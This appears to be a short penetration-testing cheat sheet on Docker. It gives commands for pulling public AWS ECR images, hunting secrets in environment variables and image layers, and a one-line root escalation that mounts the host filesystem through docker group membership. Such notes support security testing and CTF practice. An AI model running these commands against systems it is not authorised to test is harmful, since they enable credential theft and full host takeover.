---
title: Docker
desc: A set of platform as a service products that use OS-level virtualization to deliver software in packages called containers.
tags: [AWS, Container, Docker, PrivEsc]
alts: [ContainerEscape, Kubernetes]
website: 
render_with_liquid: false
---

## Basic Commands

```sh
# List images
docker images
```

<br />

## AWS ECR (Elastic Container Registry) Public Gallery

```sh
# Retrieve a container image
docker pull public.ecr.aws/<registry-alias>/<repository>:latest

# Check if it was pulled
docker images

# Run the container and interact with it
docker run -it public.ecr.aws/<registry-alias>/<repository>:latest

# --------------------------------------------------

# In the container

# Get sensitive information (ex. api_key)
printenv

# ---------------------------------------------------

# In attack machine

# Check the container config and retrieve sensitive information
mkdir example
cd example/
docker save -o example.tar public.ecr.aws/<registry-alias>/<repository>:latest
tar -xf example.tar
# Config files
cat manifest.json | jq
cat f9ab.......json | jq
# Also config file in each directory
cd 2246f........../
tar -xvf layer.tar
# Get sensitive information
grep -e 'token' -e 'secret' */*
```

<br />

## Root Privilege Escalation

```sh
# Check if current user belongs to "docker" group.
groups

# If the user belongs to "docker" group, you can get a root shell.
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```